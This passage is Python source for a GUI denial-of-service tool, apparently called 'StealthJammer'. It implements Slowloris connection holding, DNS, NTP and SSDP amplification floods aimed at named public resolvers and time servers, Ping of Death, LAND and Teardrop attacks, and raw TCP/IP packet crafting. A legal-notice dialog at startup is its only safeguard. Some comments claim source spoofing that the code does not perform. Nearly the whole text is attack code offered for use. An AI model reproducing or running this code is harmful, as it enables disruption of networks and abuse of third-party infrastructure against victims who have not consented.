        ]
        
        try:
            # Create initial connections
            for _ in range(200 * self.thread_multiplier):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, 80))
                    sock.send(b"GET /? HTTP/1.1\r\n")
                    for header in headers:
                        sock.send(f"{header}\r\n".encode())
                    connections.append(sock)
                    self.packets_sent += 1
                except:
                    pass
            
            # Keep connections alive with partial headers
            while self.attack_active:
                try:
                    for sock in connections[:]:
                        try:
                            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                            self.packets_sent += 1
                            self.bytes_sent += 20
                        except:
                            connections.remove(sock)
                            # Replace dead connection
                            try:
                                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_sock.settimeout(4)
                                new_sock.connect((self.target_ip, 80))
                                new_sock.send(b"GET /? HTTP/1.1\r\n")
                                for header in headers:
                                    new_sock.send(f"{header}\r\n".encode())
                                connections.append(new_sock)
                            except:
                                pass
                    time.sleep(10)
                except:
                    pass
        except:
            pass
        finally:
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
    
    def dns_amplification_attack(self):
        """DNS amplification - sends DNS queries to open resolvers with spoofed source"""
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220"
        ]
        
        # DNS query for ANY record (maximum amplification)
        dns_query = (
            b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            b'\x03www\x06google\x03com\x00\x00\xff\x00\x01'
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.attack_active:
                try:
                    for dns_server in dns_servers:
                        for _ in range(self.burst_size):
                            sock.sendto(dns_query, (dns_server, 53))
                            self.packets_sent += 1
                            self.bytes_sent += len(dns_query)
                    time.sleep(0.001)
                except:
                    pass
        except:
            pass
    
    def ntp_amplification_attack(self):
        """NTP amplification - exploits monlist command for amplification"""
        ntp_servers = [
            "time.google.com", "time.windows.com", "pool.ntp.org",
            "time.nist.gov", "time.cloudflare.com"
        ]
        
        # NTP monlist query (deprecated but still works on some servers)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.attack_active:
                try:
                    for server in ntp_servers:
                        try:
                            for _ in range(self.burst_size):
                                sock.sendto(ntp_query, (server, 123))
                                self.packets_sent += 1
                                self.bytes_sent += len(ntp_query)
                        except:
                            pass
                    time.sleep(0.001)
                except:
                    pass
        except:
            pass
    
    def ssdp_amplification_attack(self):
        """SSDP amplification - exploits UPnP SSDP for reflection"""
        ssdp_request = (
            b'M-SEARCH * HTTP/1.1\r\n'
            b'HOST: 239.255.255.250:1900\r\n'
            b'MAN: "ssdp:discover"\r\n'
            b'MX: 2\r\n'
            b'ST: ssdp:all\r\n\r\n'
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        sock.sendto(ssdp_request, ("239.255.255.250", 1900))
                        self.packets_sent += 1
                        self.bytes_sent += len(ssdp_request)
                    time.sleep(0.001)
                except:
                    pass
        except:
            pass
    
    def ping_of_death_attack(self):
        """Ping of Death - sends oversized ICMP packets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Create oversized ping packet (>65535 bytes when reassembled)
            packet_id = random.randint(1, 65535)
            
            while self.attack_active:
                try:
                    # Send massive ICMP echo request
                    payload = bytes(random.getrandbits(8) for _ in range(65500))
                    sock.sendto(payload, (self.target_ip, 0))
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)
                    time.sleep(0.001)
                except:
                    pass
        except Exception as e:
            self.log_message(f"Ping of Death failed (needs admin): {e}", "ERROR")
    
    def land_attack(self):
        """LAND attack - sends packets with same source and destination"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while self.attack_active:
                try:
                    # Craft packet where source = destination
                    packet = self.craft_tcp_syn(self.target_ip, self.target_ip, 80, 80)
                    sock.sendto(packet, (self.target_ip, 0))
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                    time.sleep(0.001)
                except:
                    pass
        except Exception as e:
            self.log_message(f"LAND attack failed (needs admin): {e}", "ERROR")
    
    def teardrop_attack(self):
        """Teardrop - sends overlapping IP fragments to crash systems"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while self.attack_active:
                try:
                    # First fragment
                    frag1 = self.craft_fragment(self.target_ip, offset=0, more_frags=True)
                    sock.sendto(frag1, (self.target_ip, 0))
                    
                    # Overlapping second fragment
                    frag2 = self.craft_fragment(self.target_ip, offset=4, more_frags=False)
                    sock.sendto(frag2, (self.target_ip, 0))
                    
                    self.packets_sent += 2
                    self.bytes_sent += len(frag1) + len(frag2)
                    time.sleep(0.001)
                except:
                    pass
        except Exception as e:
            self.log_message(f"Teardrop attack failed (needs admin): {e}", "ERROR")
    
    def craft_fragment(self, target_ip, offset, more_frags=True, overlap=False):
        """Craft malformed IP fragment"""
        import struct
        
        # IP header
        ihl_ver = 0x45
        tos = 0
        tot_len = 60
        packet_id = random.randint(1, 65535)
        
        if more_frags:
            flags = 0x2000 | (offset & 0x1FFF)
        else:
            flags = offset & 0x1FFF
        
        ttl = 64
        protocol = socket.IPPROTO_UDP
        checksum = 0
        src_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
        dst_ip = socket.inet_aton(target_ip)
        
        header = struct.pack('!BBHHHBBH4s4s', ihl_ver, tos, tot_len, packet_id, flags,
                           ttl, protocol, checksum, src_ip, dst_ip)
        
        payload = bytes(random.getrandbits(8) for _ in range(40))
        return header + payload
    
    def craft_tcp_syn(self, src_ip, dst_ip, src_port, dst_port):
        """Craft TCP SYN packet with IP header"""
        import struct
        
        # IP Header
        ihl_ver = 0x45
        tos = 0
        tot_len = 40
        packet_id = random.randint(1, 65535)
        flags = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        checksum = 0
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s', ihl_ver, tos, tot_len, packet_id, flags,
                               ttl, protocol, checksum, src_addr, dst_addr)
        
        # TCP Header
        seq = random.randint(0, 0xFFFFFFFF)
        ack_seq = 0
        doff_res = 0x50
        flags = 0x02  # SYN
        window = 65535
        tcp_checksum = 0
        urg_ptr = 0
        
        tcp_header = struct.pack('!HHIIBBHHH', src_port, dst_port, seq, ack_seq, doff_res,
                                flags, window, tcp_checksum, urg_ptr)
        
        return ip_header + tcp_header
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack_active:
            # Calculate duration
            duration = int(time.time() - self.start_time)
            
            # Calculate rates
            current_time = time.time()
            time_diff = current_time - self.last_update_time
            
            if time_diff >= 1.0:  # Update rates every second
                packet_diff = self.packets_sent - self.last_packet_count
                byte_diff = self.bytes_sent - self.last_byte_count
                
                self.current_pps = int(packet_diff / time_diff)
                self.current_bandwidth = int(byte_diff / time_diff)
                
                self.last_packet_count = self.packets_sent
                self.last_byte_count = self.bytes_sent
                self.last_update_time = current_time
            
            # Update labels
            self.packets_label.config(text=f"{self.packets_sent:,}")
            self.time_label.config(text=f"{duration}s")
            self.rate_label.config(text=f"{self.current_pps:,} pps")
            self.bandwidth_label.config(text=f"{self.format_bytes(self.current_bandwidth)}/s")
            self.data_label.config(text=self.format_bytes(self.bytes_sent))
            self.threads_label.config(text=f"{len(self.attack_threads)}")
        
        # Update ping
        if self.current_ping >= 0:
            if self.current_ping == 0:
                self.ping_label.config(text="<1 ms", foreground=self.success_color)
            elif self.current_ping < 50:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.success_color)
            elif self.current_ping < 100:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.warning_color)
            else:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.danger_color)
        else:
            self.ping_label.config(text="Timeout", foreground=self.danger_color)
        
        # Schedule next update
        self.after(200, self.update_stats)  # Update every 200ms for smoother display
    
    def on_destroy(self):
        """Cleanup on exit"""
        self.attack_active = False
        self.ping_monitoring = False
        
        # Note: Windows MAC address restoration would require registry changes
        # which we're not implementing for safety reasons
        
        self.log_message("System shutdown initiated", "WARNING")
        self.destroy()

if __name__ == "__main__":
    # Show warning on startup
    root = tk.Tk()
    root.withdraw()
    
    response = messagebox.askyesno(
        "WARNING - Legal Notice",
        "This tool is designed for authorized security testing only.\n\n"
        "Unauthorized network attacks are ILLEGAL and may result in:\n"
        "• Criminal prosecution\n"
        "• Civil liability\n"
        "• Network disruption\n\n"
        "By clicking 'Yes', you confirm:\n"
        "1. You have explicit authorization to test this network\n"
        "2. You understand the legal implications\n"
        "3. You accept full responsibility for your actions\n\n"
        "Do you wish to continue?",
        icon='warning'
    )
    
    root.destroy()
    
    if response:
        app = StealthJammer()
        app.mainloop()
    else:
        sys.exit(0)
